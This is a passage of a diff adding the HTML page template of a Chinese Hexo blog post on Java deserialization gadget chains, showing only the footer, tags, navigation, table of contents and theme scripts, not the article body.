+                    作者
+                </div>
+                <div class="content">1diot9</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2025-10-27 19:32</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/10/21/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"
+                                   title="二次反序列化总结"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">二次反序列化总结</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#transform"><span class="nav-number">2.</span> <span class="nav-text">?-&gt;transform</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LazyMap"><span class="nav-number">2.1.</span> <span class="nav-text">LazyMap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DefaultedMap"><span class="nav-number">2.2.</span> <span class="nav-text">DefaultedMap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#idea%E6%8C%96%E6%8E%98"><span class="nav-number">2.2.1.</span> <span class="nav-text">idea挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tabby%E6%8C%96%E6%8E%98"><span class="nav-number">2.2.2.</span> <span class="nav-text">tabby挖掘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformingComparator"><span class="nav-number">2.3.</span> <span class="nav-text">TransformingComparator</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#transform-newInstance"><span class="nav-number">3.</span> <span class="nav-text">transform-&gt;newInstance</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#InstantiateTransformer"><span class="nav-number">3.1.</span> <span class="nav-text">InstantiateTransformer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FactoryTransformer"><span class="nav-number">3.2.</span> <span class="nav-text">FactoryTransformer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tabby%E6%8C%96%E6%8E%98-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">tabby挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#idea%E6%8C%96%E6%8E%98-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">idea挖掘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CloneTransformer"><span class="nav-number">3.3.</span> <span class="nav-text">CloneTransformer</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">4.</span> <span class="nav-text">二次反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">1diot9</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">77.5k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#transform"><span class="nav-number">2.</span> <span class="nav-text">?-&gt;transform</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LazyMap"><span class="nav-number">2.1.</span> <span class="nav-text">LazyMap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DefaultedMap"><span class="nav-number">2.2.</span> <span class="nav-text">DefaultedMap</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#idea%E6%8C%96%E6%8E%98"><span class="nav-number">2.2.1.</span> <span class="nav-text">idea挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#tabby%E6%8C%96%E6%8E%98"><span class="nav-number">2.2.2.</span> <span class="nav-text">tabby挖掘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TransformingComparator"><span class="nav-number">2.3.</span> <span class="nav-text">TransformingComparator</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#transform-newInstance"><span class="nav-number">3.</span> <span class="nav-text">transform-&gt;newInstance</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#InstantiateTransformer"><span class="nav-number">3.1.</span> <span class="nav-text">InstantiateTransformer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FactoryTransformer"><span class="nav-number">3.2.</span> <span class="nav-text">FactoryTransformer</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#tabby%E6%8C%96%E6%8E%98-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">tabby挖掘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#idea%E6%8C%96%E6%8E%98-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">idea挖掘</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CloneTransformer"><span class="nav-number">3.3.</span> <span class="nav-text">CloneTransformer</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">4.</span> <span class="nav-text">二次反序列化</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+            
+<script src="/js/post/copyright-info.js"></script>
+
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
